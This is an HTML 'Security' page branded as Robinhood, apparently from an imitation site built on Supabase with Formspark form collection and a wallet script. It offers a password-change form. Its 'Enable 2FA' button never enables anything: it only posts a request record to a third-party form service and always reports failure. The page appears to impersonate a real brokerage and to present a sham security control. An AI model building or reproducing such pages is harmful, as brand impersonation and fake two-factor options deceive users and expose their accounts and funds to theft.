<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Security — Robinhood</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="../assets/css/app.css"></head><body>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script><script src="../assets/js/supabase.js"></script><script src="../assets/js/auth.js"></script><script src="../assets/js/shell.js"></script><script src="../assets/js/prices.js"></script><script src="../assets/js/formspark.js"></script><script src="../assets/js/wallet.js"></script>
<script>
(async () => { const session = await requireAuth(); if(!session) return; await renderShell({active:"security",session}); const c=document.getElementById("content"); c.innerHTML = `<h1>Security</h1><div class="card"><h3>Change password</h3><form id="pf"><div class="field"><label>New password</label><input name="pw" type="password" minlength="6" required></div><button class="btn btn-primary" type="submit">Update</button><span id="pok" class="green hidden" style="margin-left:12px">Updated</span></form></div><div class="card"><h3>Two-Factor Authentication</h3><p class="muted">Not enabled</p><button class="btn btn-ghost btn-sm" onclick="submitToFormspark({form:\x27security_2fa\x27,requested:true}).then(()=>alert(\x27Unable to enable 2FA right now. Please try again later.\x27))">Enable 2FA</button></div>`;
document.getElementById("pf").onsubmit=async e=>{e.preventDefault();const pw=new FormData(e.target).get("pw");const {error}=await sb.auth.updateUser({password:pw});if(error)alert(error.message);else document.getElementById("pok").classList.remove("hidden");}; })();
</script></body></html>
